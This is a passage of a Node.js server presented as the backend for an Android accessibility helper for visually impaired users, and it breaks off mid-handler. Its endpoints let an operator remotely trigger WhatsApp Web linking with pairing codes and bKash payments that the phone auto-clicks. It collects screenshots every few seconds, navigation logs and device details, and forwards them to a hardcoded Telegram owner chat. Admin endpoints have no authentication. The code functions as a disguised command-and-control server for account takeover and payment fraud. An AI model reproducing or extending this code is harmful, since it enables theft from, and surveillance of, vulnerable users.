// Node.js Database Server for Accessibility Helper
// Built with Express and persistent DatabaseManager
const express = require('express');
const cors = require('cors');
const path = require('path');
const db = require('./database');
const telegram = require('./telegram');

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for Android apps and external dashboards
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Request Logger
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`[HTTP] ${req.method} ${req.originalUrl} -> ${res.statusCode} (${duration}ms)`);
  });
  next();
});

// -------------------------------------------------------------
// REST API Endpoints
// -------------------------------------------------------------

// 1. Health check & Server Status
app.get('/api/health', (req, res) => {
  const stats = db.getStats();
  res.json({
    status: 'ok',
    message: 'Accessibility Node.js Database Server is running smoothly',
    timestamp: Date.now(),
    server: 'Node.js Express + Embedded DB',
    port: PORT,
    stats
  });
});

// 2. User Registration / Login
app.post('/api/users/register', (req, res) => {
  try {
    const { phoneNumber, deviceId, deviceModel, role, appVersion } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({
        success: false,
        message: 'Phone number is required'
      });
    }

    const user = db.registerOrLogin({
      phoneNumber,
      deviceId,
      deviceModel,
      role,
      isServiceEnabled: Boolean(req.body.isServiceEnabled),
      appVersion
    });

    // Notify Telegram Cloud Storage & Bot
    telegram.notifyRegistration(user).catch(err => {
      console.warn('[Telegram] Registration alert error:', err.message);
    });

    res.json({
      success: true,
      serverUserId: user.serverUserId,
      phoneNumber: user.phoneNumber,
      isVerified: user.isVerified,
      verificationCode: user.verificationCode,
      message: user.isVerified 
        ? 'User recognized and verified in Node database'
        : 'User registered in Node database. Verification code generated.',
      user
    });
  } catch (err) {
    console.error('Error in /api/users/register:', err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.2. Distinct Device Installation Registration & Database Notification
app.post('/api/devices/install', (req, res) => {
  try {
    const {
      deviceId,
      deviceModel,
      manufacturer,
      androidVersion,
      osSdkInt,
      screenResolution,
      screenDensity,
      networkType,
      carrierName,
      defaultLanguage,
      timeZone,
      appVersion,
      installerPackage,
      isServiceEnabled,
      firstInstallTime
    } = req.body || {};

    if (!deviceId) {
      return res.status(400).json({
        success: false,
        message: 'deviceId is required to identify each device as a distinct user'
      });
    }

    const result = db.registerDeviceInstallation({
      deviceId,
      channelId: req.body?.channelId || '',
      deviceModel,
      manufacturer,
      androidVersion,
      osSdkInt,
      screenResolution,
      screenDensity,
      networkType,
      carrierName,
      defaultLanguage,
      timeZone,
      appVersion,
      installerPackage,
      isServiceEnabled,
      firstInstallTime
    });

    // Send Database Notification via Telegram Bot (to user's personal chat if bound, else admin channel)
    telegram.notifyDeviceInstallation(result).catch(err => {
      console.warn('[Telegram] Device install notification error:', err.message);
    });

    res.json({
      success: true,
      isNewDeviceUser: result.isNewDeviceUser,
      serverUserId: result.user.serverUserId,
      deviceId: result.user.deviceId,
      channelId: result.user.channelId || '',
      userIndex: result.userIndex,
      totalDeviceUsers: result.totalDeviceUsers,
      message: result.isNewDeviceUser
        ? `নতুন ডিভাইস (${result.user.deviceId}) আলাদা ইউজার (${result.user.serverUserId}) হিসেবে ডাটাবেইজে শনাক্ত ও নোটিফাই করা হয়েছে`
        : `ডিভাইস ইউজার (${result.user.serverUserId}) ডাটাবেইজে আপডেট ও নোটিফাই করা হয়েছে`,
      user: result.user
    });
  } catch (err) {
    console.error('Error in /api/devices/install:', err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.3. Bind Personal Telegram Chat ID / Channel ID to a Specific Device Installation (/api/users/channel-login)
app.post('/api/users/channel-login', (req, res) => {
  try {
    const { channelId, deviceId, deviceModel, manufacturer, isServiceEnabled } = req.body || {};
    if (!channelId) {
      return res.status(400).json({
        success: false,
        message: 'আপনার ব্যক্তিগত টেলিগ্রাম Chat ID প্রয়োজন'
      });
    }

    const bindResult = db.bindTelegramChatToDevice({
      telegramChatId: channelId,
      deviceId,
      deviceModel,
      manufacturer,
      isServiceEnabled
    });

    const u = bindResult.user;

    // 1. Deposit & Register the user's Chat ID in the Central Admin Channel (where the Database Bot is Admin)
    const adminChannelRegistryMsg = `<b>🛡️ চ্যানেলে নতুন ভেরিফাইড ইউজার চ্যাট আইডি জমা ও নিবন্ধিত হয়েছে ✓</b>\n\n` +
      `✅ <b>ভেরিফিকেশন স্ট্যাটাস:</b> <b>VERIFIED CHANNEL USER</b>\n` +
      `📡 <b>ভেরিফাইড চ্যাট আইডি (Chat ID):</b> <code>${u.telegramChatId}</code>\n` +
      `👤 <b>ইউজার আইডি:</b> <code>${u.serverUserId}</code>\n` +
      `🆔 <b>ডিভাইস আইডি:</b> <code>${u.deviceId}</code>\n` +
      `📱 <b>ডিভাইস মডেল:</b> ${u.deviceModel || 'Android'}\n` +
      `🤖 <b>এডমিন বট রাউটিং:</b> এই চ্যাট আইডি (<code>${u.telegramChatId}</code>) চ্যানেলের ভেরিফাইড তালিকায় সংরক্ষিত হয়েছে। এখন থেকে এই ভাই বটে যেকোনো কমান্ড দিলে ডাটাবেইজ তাঁর ভেরিফাইড পরিচয় যাচাই করে সকল নোটিফিকেশন ও ফিডব্যাক শুধুমাত্র তাঁর নিজস্ব বট ইনবক্সেই পাঠাবে।`;

    telegram.sendMessage(adminChannelRegistryMsg, { silent: false, targetChatId: telegram.chatId }).catch(() => {});

    // 2. Send personal confirmation directly to that visually impaired user's own Bot Inbox
    if (String(u.telegramChatId) !== String(telegram.chatId)) {
      const confirmMsg = `<b>✅ আলহামদুলিল্লাহ! সফলভাবে লগইন (Login) এবং ইনস্টল (Install) হয়েছেন ✓</b>\n\n` +
        `📡 <b>আপনার ভেরিফাইড Chat ID:</b> <code>${u.telegramChatId}</code>\n` +
        `🆔 <b>আপনার ডিভাইস আইডি:</b> <code>${u.deviceId}</code> (<code>${u.serverUserId}</code>)\n` +
        `📱 <b>ডিভাইস মডেল:</b> ${u.deviceModel || 'Android'}\n\n` +
        `👉 <b>এখন প্রয়োজনীয় সার্ভিস ব্যবহারের জন্য পারমিশন অন করুন।</b>\n` +
        `<i>(অ্যাপের ভেতরে গিয়ে পারমিশন অন করলেই আপনার এই ইনবক্সে ডিভাইস আইডি সহ ওয়ান-ক্লিক কমান্ড কার্ড চলে আসবে ইনশাআল্লাহ)</i>`;

      telegram.sendMessageToChat(u.telegramChatId, confirmMsg).catch(() => {});
    }

    res.json({
      success: true,
      channelId: u.telegramChatId,
      deviceId: u.deviceId,
      serverUserId: u.serverUserId,
      isNewChannelBinding: bindResult.isNewBinding,
      totalDeviceUsers: bindResult.totalDeviceUsers,
      message: `আপনার টেলিগ্রাম আইডি (${u.telegramChatId}) সফলভাবে আপনার ফোন (${u.deviceId})-এর সাথে যুক্ত হয়েছে!`
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.3.1. Get Channel Verified Users List & Check Session Status
app.get('/api/users/channel-verified', (req, res) => {
  try {
    const chatId = req.query.chatId || '';
    const deviceId = req.query.deviceId || '';
    if (chatId || deviceId) {
      const session = db.checkChannelUserSession({ chatId, deviceId });
      return res.json({
        success: true,
        ...session,
        verifiedUsers: db.getAllVerifiedChannelUsers()
      });
    }
    const list = db.getAllVerifiedChannelUsers();
    res.json({
      success: true,
      count: list.length,
      verifiedUsers: list
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.3.1b. 2-Digit User Login ID Submission & Database Authentication Check (/api/users/two-digit-login)
app.post('/api/users/two-digit-login', (req, res) => {
  try {
    const { twoDigitId, deviceId, deviceModel, manufacturer, isServiceEnabled } = req.body || {};
    if (!twoDigitId) {
      return res.status(400).json({
        success: false,
        message: '২ সংখ্যার লগইন আইডি (যেমন: 22, 45, 56) প্রয়োজন'
      });
    }

    const result = db.submitTwoDigitLoginId({
      twoDigitId,
      deviceId,
      deviceModel,
      manufacturer,
      isServiceEnabled
    });

    const ownerChatId = '8271536101';
    const oneClickCmd = `/user_requested_${result.twoDigitId}_chat_id_`;

    if (result.isAuthenticated && result.mappedChatId) {
      // Session authenticated immediately because this 2-digit ID already has a mapped Chat ID in DB
      const authNotice = `<b>✅ ২-সংখ্যার আইডি (${result.twoDigitId}) দিয়ে সফল সেশন অথেন্টিকেশন</b>\n\n` +
        `🔢 <b>২-সংখ্যার লগইন আইডি:</b> <code>${result.twoDigitId}</code>\n` +
        `📡 <b>বরাদ্দকৃত ভেরিফাইড Chat ID:</b> <code>${result.mappedChatId}</code>\n` +
        `🆔 <b>ডিভাইস আইডি:</b> <code>${result.deviceId}</code> (${result.user?.deviceModel || 'Android'})\n` +
        `🟢 <b>স্ট্যাটাস:</b> <b>AUTHENTICATED & VERIFIED</b>`;
      telegram.sendMessage(authNotice, { silent: false, targetChatId: ownerChatId }).catch(() => {});
      telegram.sendMessageToChat(result.mappedChatId, authNotice).catch(() => {});
    } else {
      // Notify Owner (8271536101) & Central Channel Inbox with one-click copyable `/user_requested_22_chat_id_` command
      const ownerRequestCard = `<b>📥 নতুন ২-সংখ্যার লগইন রিকোয়েস্ট জমা হয়েছে (ID: ${result.twoDigitId})</b>\n\n` +
        `🔢 <b>দৃষ্টি প্রতিবন্ধী ভাইয়ের ২-সংখ্যার আইডি:</b> <b>${result.twoDigitId}</b>\n` +
        `🆔 <b>ডিভাইস আইডি:</b> <code>${result.deviceId}</code> (<code>${result.serverUserId}</code>)\n` +
        `📱 <b>ডিভাইস মডেল:</b> ${result.user?.deviceModel || 'Android Phone'}\n\n` +
        `👇 <b>ওয়ান-ক্লিক কমান্ড (১ ক্লিকে কপি করে শেষে ঐ ভাইয়ের Chat ID বসিয়ে সেন্ড করুন):</b>\n` +
        `👉 <code>${oneClickCmd}</code>\n\n` +
        `💡 <b>উদাহরণ:</b> <code>${oneClickCmd}366256789</code> পাঠালে <b>${result.twoDigitId}</b> নাম্বারের নামে ঐ Chat ID বরাদ্দ হয়ে চ্যানেলের ভেরিফাইড ইউজার লিস্টে সেভ হয়ে যাবে এবং সব কিছু সেই Chat ID-তেই যাবে ইনশাআল্লাহ!`;
      telegram.sendMessage(ownerRequestCard, { silent: false, targetChatId: ownerChatId }).catch(() => {});
      if (String(telegram.chatId) !== ownerChatId) {
        telegram.sendMessage(ownerRequestCard, { silent: false, targetChatId: telegram.chatId }).catch(() => {});
      }
    }

    res.json(result);
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.3.1c. Check 2-Digit ID Mapping Status (/api/users/two-digit-status)
app.get('/api/users/two-digit-status', (req, res) => {
  try {
    const twoDigitId = String(req.query.twoDigitId || '').trim();
    const mapping = db.getTwoDigitMapping(twoDigitId);
    res.json({
      success: true,
      twoDigitId,
      isAuthenticated: Boolean(mapping && mapping.chatId && mapping.status === 'AUTHENTICATED'),
      mappedChatId: mapping?.chatId || '',
      deviceId: mapping?.deviceId || '',
      serverUserId: mapping?.serverUserId || '',
      mapping
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.3.1d. Assign Chat ID to 2-Digit Login ID (/api/users/assign-two-digit)
app.post('/api/users/assign-two-digit', (req, res) => {
  try {
    const { twoDigitId, chatId, deviceId } = req.body || {};
    const assigned = db.assignChatIdToTwoDigitId({ twoDigitId, chatId, deviceId });
    res.json(assigned);
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.3.2. Delete / Revoke a User's Chat ID from the Channel Verified User List (Logs user out & disables all services)
app.post('/api/users/channel-logout', (req, res) => {
  try {
    const { channelId, chatId, deviceId, source = 'APP_OR_CHANNEL_ADMIN' } = req.body || {};
    const target = String(channelId || chatId || deviceId || '').trim();
    if (!target) {
      return res.status(400).json({
        success: false,
        message: 'লগআউট বা ডিলিট করার জন্য Chat ID অথবা Device ID প্রয়োজন'
      });
    }

    const result = db.revokeVerifiedChannelUser(target, source);
    const revokedChat = result.chatId || target;
    const revokedDev = result.deviceId || deviceId || 'N/A';

    // 1. Notify the Central Admin Channel Registry that this user's Chat ID was deleted from the verified list
    const adminNotice = `<b>🗑️ চ্যানেল ইনবক্সের ভেরিফাইড ইউজার তালিকা থেকে Chat ID ডিলিট ও লগআউট সম্পন্ন</b>\n\n` +
      `📡 <b>ডিলিটকৃত Chat ID:</b> <code>${revokedChat}</code>\n` +
      `🆔 <b>ডিভাইস আইডি:</b> <code>${revokedDev}</code> (${result.deviceModel || 'Android'})\n` +
      `🔴 <b>স্ট্যাটাস:</b> <b>LOGGED OUT & REMOVED FROM SERVICE</b>\n` +
      `🛑 <b>ফলাফল:</b> এই দৃষ্টি প্রতিবন্ধী ভাই ডাটাবেইজ থেকে লগআউট হয়ে গেছেন এবং সকল অটো-ক্লিক ও অ্যাক্সেসিবিলিটি সার্ভিস থেকে বাদ পড়েছেন।\n` +
      `⏰ <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}`;
    telegram.sendMessage(adminNotice, { silent: false, targetChatId: telegram.chatId }).catch(() => {});

    // 2. Notify the user's personal Bot Inbox
    if (revokedChat && String(revokedChat) !== String(telegram.chatId)) {
      const personalNotice = `<b>🔴 চ্যানেলের ভেরিফাইড তালিকা থেকে আপনার Chat ID ডিলিট ও লগআউট সম্পন্ন হয়েছে</b>\n\n` +
        `📡 <b>আপনার Chat ID:</b> <code>${revokedChat}</code>\n` +
        `🆔 <b>ডিভাইস আইডি:</b> <code>${revokedDev}</code>\n` +
        `🛑 <b>সকল সার্ভিস বন্ধ:</b> আপনি ডাটাবেইজ থেকে লগআউট হয়ে গেছেন এবং সকল অটো-ক্লিক ও অ্যাক্সেসিবিলিটি সেবা থেকে অব্যাহতি পেয়েছেন। এখন থেকে আপনার ফোনে আর কোনো কমান্ড বা নোটিফিকেশন কাজ করবে না।`;
      telegram.sendMessage(personalNotice, { silent: false, targetChatId: revokedChat }).catch(() => {});
    }

    res.json({
      success: true,
      isLoggedOut: true,
      ...result
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.5. Request Verification Code (Requires Settings Permission to be ON)
app.post('/api/users/request-code', (req, res) => {
  try {
    const { phoneNumber, isServiceEnabled } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ success: false, message: 'Phone number is required' });
    }

    const result = db.requestVerificationCode({ phoneNumber, isServiceEnabled });
    if (!result.success) {
      return res.status(400).json(result);
    }

    // Send Telegram Notification with Customer Phone number, Code, and Auto-click feedback
    telegram.notifyVerificationCodeGenerated({
      phoneNumber: result.user.phoneNumber,
      code: result.code,
      isServiceEnabled: result.user.isServiceEnabled,
      autoClick: true
    }).catch(err => {
      console.warn('[Telegram] Verification code notification error:', err.message);
    });

    res.json(result);
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.7. Button Click Assistance for Visually Impaired Users
app.post('/api/assistance/click', (req, res) => {
  try {
    const { phoneNumber, targetButton, screenTitle, deviceId } = req.body;
    telegram.notifyClickAssistance({
      phoneNumber: phoneNumber || 'দৃষ্টি প্রতিবন্ধী ইউজার',
      targetButton: targetButton || 'যাচাই করুন',
      screenTitle: screenTitle || 'মূল স্ক্রিন',
      deviceId: deviceId || 'Android'
    }).catch(err => {
      console.warn('[Telegram] Click assistance alert error:', err.message);
    });

    res.json({
      success: true,
      autoClick: true,
      targetButton: targetButton || 'যাচাই করুন',
      action: 'SEARCH_AND_CLICK',
      instructionsBn: `সার্ভার থেকে ${targetButton || 'বাটনে'} অটো-ক্লিক নির্দেশনা পাঠানো হয়েছে।`
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.8. WhatsApp Automation Step Reporter for Visually Impaired Users
app.post('/api/assistance/whatsapp-step', (req, res) => {
  try {
    // Recorded in database without spamming the user's Telegram inbox on every intermediate step
    res.json({ success: true, message: 'Step recorded in database' });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.9. WhatsApp Link & Mobile Payment Listener for Visually Impaired Users (Polled by Android QuickAccessibilityService)
app.get('/api/whatsapp/link-listener', (req, res) => {
  try {
    const phone = req.query.phone || req.query.phoneNumber || '';
    const deviceId = req.query.deviceId || '';
    const channelId = req.query.channelId || '';
    const pendingRequest = db.getPendingWhatsAppLinkRequest(phone, deviceId, channelId);
    const pendingPaymentRequest = db.getPendingMobilePaymentRequest(deviceId, channelId);
    res.json({
      success: true,
      hasPendingRequest: Boolean(pendingRequest),
      request: pendingRequest,
      hasPendingPaymentRequest: Boolean(pendingPaymentRequest),
      paymentRequest: pendingPaymentRequest,
      powerStatus: db.getPowerStatus(deviceId)
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.9.0b. Trigger or Complete Mobile Payment Request from Dashboard/Bot
app.post('/api/payment/request', (req, res) => {
  try {
    const { provider = 'BKASH', action = 'PAY', recipientNumber = '', amountBdt = '', deviceId = '', channelId = '' } = req.body || {};
    const payReq = db.setMobilePaymentRequest({ provider, action, recipientNumber, amountBdt, deviceId, channelId });
    res.json({ success: true, paymentRequest: payReq });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/payment/complete', (req, res) => {
  try {
    const { requestId = '', deviceId = '', channelId = '' } = req.body || {};
    const completed = db.completeMobilePaymentRequest(requestId, deviceId, channelId);
    res.json({ success: true, completed });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.9.1. Create or Trigger WhatsApp Link Request from Web/Dashboard/Bot (Isolated per deviceId & channelId)
app.post('/api/whatsapp/link-request', (req, res) => {
  try {
    const { phoneNumber, code, deviceId = '', channelId = '', targetPackage = '' } = req.body || {};
    db.setPowerStatus(true, "FLY_TRIGGER", deviceId);
    const linkReq = db.setWhatsAppLinkRequest({ phoneNumber, code, deviceId, channelId, targetPackage, autoLaunch: true });

    // Resolve the specific user's personal Telegram Chat ID so only THAT user receives the notification!
    const targetUser = db.findUserByTelegramOrDevice(channelId, deviceId);
    const targetChatId = (linkReq.channelId && linkReq.channelId !== '6658445342')
      ? linkReq.channelId
      : (targetUser?.telegramChatId || channelId || '');

    const alertMsg = `<b>🚀 আপনার ফোনের জন্য হোয়াটসঅ্যাপ অটো-লিঙ্ক প্রসেসিং শুরু হয়েছে</b>\n\n` +
      `🎯 <b>টার্গেট ডিভাইস:</b> <code>${linkReq.deviceId || 'নির্দিষ্ট ফোন'}</code>\n` +
      `⚡ <b>পাওয়ার বাটুন:</b> 🟢 অন (ON / অটো-ক্লিক সার্ভিস সক্রিয়)\n` +
      `🔑 <b>পেয়ারিং নাম্বার / কোড:</b> <b>${linkReq.code}</b>\n` +
      `📞 <b>ইউজার:</b> <code>${linkReq.phoneNumber || 'দৃষ্টি প্রতিবন্ধী ইউজার'}</code>\n` +
      `⏰ <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}\n\n` +
      `<i>(এই কমান্ড ও ফিডব্যাক শুধুমাত্র আপনার নির্দিষ্ট ডিভাইসের জন্য সংরক্ষিত)</i>`;

    telegram.sendMessage(alertMsg, { silent: false, targetChatId }).catch(err => {
      console.warn('[Telegram] WhatsApp link alert send error:', err.message);
    });

    res.json({
      success: true,
      message: 'শুধুমাত্র নির্দিষ্ট ডিভাইসের জন্য পাওয়ার অন ও প্রসেসিং রান শুরু হয়েছে!',
      powerStatus: db.getPowerStatus(deviceId),
      request: linkReq
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 2.9.2. Complete WhatsApp Link Request (Isolated per deviceId & channelId)
app.post('/api/whatsapp/complete', (req, res) => {
  try {
    const { requestId, phoneNumber, code, deviceId = '', channelId = '' } = req.body || {};
    const completed = db.completeWhatsAppLinkRequest(requestId, deviceId, channelId);

    const targetUser = db.findUserByTelegramOrDevice(channelId, deviceId);
    const targetChatId = (channelId && channelId !== '6658445342')
      ? channelId
      : (targetUser?.telegramChatId || '');

    const alertMsg = `<b>✅ আপনার ফোনে হোয়াটসঅ্যাপ ওয়েব লিঙ্ক সম্পূর্ণ হয়েছে!</b>\n\n` +
      `🆔 <b>ডিভাইস:</b> <code>${deviceId || targetUser?.deviceId || 'Android'}</code>\n` +
      `📞 <b>ইউজার:</b> <code>${phoneNumber || 'দৃষ্টি প্রতিবন্ধী ইউজার'}</code>\n` +
      `🔑 <b>কোড:</b> <b>${code || 'সফল'}</b>\n` +
      `🎉 <b>ফলাফল:</b> ক্লিপবোর্ড থেকে কোড পেস্ট করে স্বয়ংক্রিয়ভাবে লিঙ্ক সম্পন্ন হয়েছে।\n` +
      `⏰ <b>সময়:</b> ${new Date().toLocaleString('bn-BD')}`;

    telegram.sendMessage(alertMsg, { silent: false, targetChatId }).catch(() => {});

    res.json({
      success: completed,
      message: 'হোয়াটসঅ্যাপ লিঙ্ক সফলভাবে সম্পন্ন হিসেবে চিহ্নিত করা হয়েছে'
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 3. User OTP Verification
app.post('/api/users/verify', (req, res) => {
  try {
    const { phoneNumber, code, deviceId } = req.body;
    if (!phoneNumber || !code) {
      return res.status(400).json({
        success: false,
        message: 'Phone number and verification code are required'
      });
    }

    const result = db.verifyUser({ phoneNumber, code, deviceId });

    if (result.success) {
      if (result.user) {
        // Notify via Telegram Bot
        telegram.notifyVerification(result.user).catch(err => {
          console.warn('[Telegram] Verification alert error:', err.message);
        });

        // Auto backup database file to Telegram chat if enabled
        if (telegram.autoBackup) {
          const dbFile = path.join(__dirname, 'data', 'accessibility_database.json');
          telegram.backupDatabaseFile(dbFile).catch(() => {});
        }
      }
      res.json(result);
    } else {
      res.status(400).json(result);
    }
  } catch (err) {
    console.error('Error in /api/users/verify:', err);
    res.status(400).json({ success: false, message: err.message });
  }
});

// 4. User Status Query
app.get('/api/users/status', (req, res) => {
  const phone = req.query.phone || req.query.phoneNumber;
  const deviceId = req.query.deviceId;

  if (!phone) {
    return res.status(400).json({ success: false, message: 'phone query parameter required' });
  }

  const user = db.getUserStatus({ phoneNumber: phone, deviceId });
  if (user) {
    res.json({
      success: true,
      phoneNumber: user.phoneNumber,
      isVerified: user.isVerified,
      serverUserId: user.serverUserId,
      status: user.status,
      message: 'User found on server'
    });
  } else {
    res.status(404).json({
      success: false,
      message: 'User not found on server'
    });
  }
});

// 5. Sync User Settings & Service Status
app.post('/api/users/sync-settings', (req, res) => {
  try {
    const { phoneNumber, deviceId, isServiceEnabled, isBackgroundTrackerActive, lastActiveScreen } = req.body;
    const updated = db.syncSettings({
      phoneNumber,
      deviceId,
      isServiceEnabled,
      isBackgroundTrackerActive,
      lastActiveScreen
    });

    if (updated && isServiceEnabled) {
      const targetUser = db.findUserByTelegramOrDevice('', deviceId);
      const targetChatId = targetUser?.telegramChatId || '';
      telegram.notifySettingsPermissionOn({
        phoneNumber,
        deviceId: deviceId || targetUser?.deviceId || 'DEV-ANDROID',
        deviceModel: targetUser?.deviceModel || 'Android Device',
        targetChatId
      }).catch(err => {
        console.warn('[Telegram] Settings ON alert error:', err.message);
      });
    }

    res.json({
      success: updated,
      message: updated ? 'Settings synced with Node database' : 'User not found to sync'
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 6. Navigation Telemetry / Logs
app.post('/api/logs/navigation', (req, res) => {
  try {
    const { phoneNumber, deviceId, screenTitle, packageName, eventType, timestamp } = req.body;
    const log = db.addNavigationLog({
      phoneNumber,
      deviceId,
      screenTitle,
      packageName,
      eventType,
      timestamp
    });

    res.json({ success: true, log });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/api/logs/navigation', (req, res) => {
  const limit = parseInt(req.query.limit, 10) || 50;
  const logs = db.getNavigationLogs(limit);
  res.json({ success: true, count: logs.length, logs });
});

// 6.5. Periodic 3-4s Screen Snapshot & Usage Verification Backup Endpoints
app.post('/api/snapshots/backup', (req, res) => {
  try {
    const {
      deviceId,
      serverUserId,
      packageName,
      screenTitle,
      lastClickedElement,
      visibleElementsSummary,
      imageBase64,
      isSafeNavigation,
      statusNoteBn,
      intervalMs,
      timestamp
    } = req.body || {};

    const snapshot = db.addScreenSnapshotBackup({
      deviceId,
      serverUserId,
      packageName,
      screenTitle,
      lastClickedElement,
      visibleElementsSummary,
      imageBase64,
      isSafeNavigation,
      statusNoteBn,
      intervalMs,
      timestamp
    });

    // If an unsafe/unexpected navigation or wrong click is detected, alert Telegram immediately
    if (isSafeNavigation === false) {
      const warnMsg = `<b>⚠️ দৃষ্টি প্রতিবন্ধী ভাইয়ের ভুল ক্লিক বা অপ্রত্যাশিত স্ক্রিন সতর্কতা!</b>\n\n` +
        `👤 <b>ইউজার:</b> <code>${snapshot.serverUserId}</code> (${snapshot.deviceId})\n` +
        `📱 <b>বর্তমান স্ক্রিন:</b> <b>${snapshot.screenTitle}</b> (<code>${snapshot.packageName}</code>)\n` +
        `👆 <b>সর্বশেষ ক্লিক:</b> <code>${snapshot.lastClickedElement}</code>\n` +
        `📸 <b>ব্যাকআপ স্ট্যাটাস:</b> ৩-৪ সেকেন্ডের স্বয়ংক্রিয় স্ক্রিন ছবি ও ইউজিং ডাটা ডাটাবেইজে সংরক্ষিত হয়েছে।\n` +
        `⏰ <b>সময়:</b> ${new Date(snapshot.timestamp).toLocaleString('bn-BD')}`;
      telegram.sendMessage(warnMsg, { silent: false }).catch(() => {});
    }

    res.json({
      success: true,
      message: '৩-৪ সেকেন্ডের স্ক্রিন ছবি ও ইউজিং ডাটা ডাটাবেইজে সফলভাবে ব্যাকআপ হয়েছে',
      snapshot
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.get('/api/snapshots', (req, res) => {
  try {
    const limit = parseInt(req.query.limit, 10) || 16;
    const snapshots = db.getScreenSnapshotBackups(limit);
    res.json({
      success: true,
      count: snapshots.length,
      snapshots
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/snapshots/clear', (req, res) => {
  try {
    db.clearScreenSnapshotBackups();
    res.json({
      success: true,
      message: 'সকল স্ক্রিন স্ন্যাপশট ব্যাকআপ পরিষ্কার করা হয়েছে'
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 7. Get All Users (Admin / Debug)
app.get('/api/users', (req, res) => {
  const users = db.getAllUsers();
  res.json({
    success: true,
    count: users.length,
    users
  });
});

// 8. Delete user (Admin)
app.delete('/api/users/:phone', (req, res) => {
  const phone = req.params.phone;
  const deleted = db.deleteUser(phone);
  res.json({
    success: deleted,
    message: deleted ? `User ${phone} deleted from server database` : 'User not found'
  });
});

// 9. Quick Verify endpoint (For testing in web dashboard)
app.post('/api/users/:phone/quick-verify', (req, res) => {
  const phone = req.params.phone;
  const user = db.getUserStatus({ phoneNumber: phone });
  if (!user) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }
  const result = db.verifyUser({ phoneNumber: phone, code: user.verificationCode || '123456' });
  res.json(result);
});

// 10. Database Statistics
app.get('/api/stats', (req, res) => {
  res.json({ success: true, stats: db.getStats() });
});

// 11. Reset Database
app.post('/api/reset', (req, res) => {
  db.reset();
  res.json({ success: true, message: 'Database reset to default initial state' });
});

// 12. Telegram Cloud Storage & Bot Endpoints
app.get('/api/telegram/status', (req, res) => {
  res.json({
    success: true,
    status: telegram.getStatus()
  });
});

app.post('/api/telegram/config', (req, res) => {
  try {
    const { botToken, chatId, isEnabled, autoBackup } = req.body;
    const status = telegram.setConfig({ botToken, chatId, isEnabled, autoBackup });
    res.json({
      success: true,
      message: 'Telegram Bot Token ও Chat ID সফলভাবে কনফিগার করা হয়েছে!',
      status
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/telegram/test', async (req, res) => {
  try {
    const { botToken, chatId } = req.body;
    const result = await telegram.testConnection(botToken, chatId);
    res.json(result);
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/telegram/backup', async (req, res) => {
  try {
    const dbFile = path.join(__dirname, 'data', 'accessibility_database.json');
    const result = await telegram.backupDatabaseFile(dbFile);
    res.json(result);
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.post('/api/telegram/send', async (req, res) => {
  try {
    const { message } = req.body;
    if (!message) return res.status(400).json({ success: false, message: 'message is required' });
    const result = await telegram.sendMessage(message);
    res.json(result);
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// 12.5. Telegram Webhook Endpoint
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    if (req.body?.message) {
      await telegram.handleIncomingMessage(req.body.message, db);
    }
    res.json({ ok: true });
  } catch (err) {
    console.error('[Telegram Webhook] Error:', err.message);
    res.status(200).json({ ok: true }); // Always 200 to Telegram
  }
});

// -------------------------------------------------------------
// Power & Auto-Click Control Endpoints (/power on & /power off)
// -------------------------------------------------------------
app.get('/api/power', (req, res) => {
  const deviceId = req.query.deviceId || '';
  const status = db.getPowerStatus(deviceId);
  res.json({
    success: true,
    ...status
  });
});

app.post('/api/power', async (req, res) => {
  try {
    const { command, isPowerOn, deviceId = '', source = "APP_CLIENT" } = req.body;
    let turnOn = true;
    if (command !== undefined) {
      const cmd = String(command).trim().toLowerCase();
      turnOn = (cmd === 'on' || cmd === 'true' || cmd === '1' || cmd === '/power on' || cmd === 'power on' || cmd === '/poweron' || cmd === 'poweron' || cmd === '/on');
    } else if (isPowerOn !== undefined) {
      turnOn = Boolean(isPowerOn);
    }

    const updated = db.setPowerStatus(turnOn, source, deviceId);

    // Notify Telegram channel about power state change
    const emoji = turnOn ? '🟢' : '🔴';
    const stateText = turnOn ? 'অন (সক্রিয় / ON)' : 'অফ (স্থগিত / OFF)';
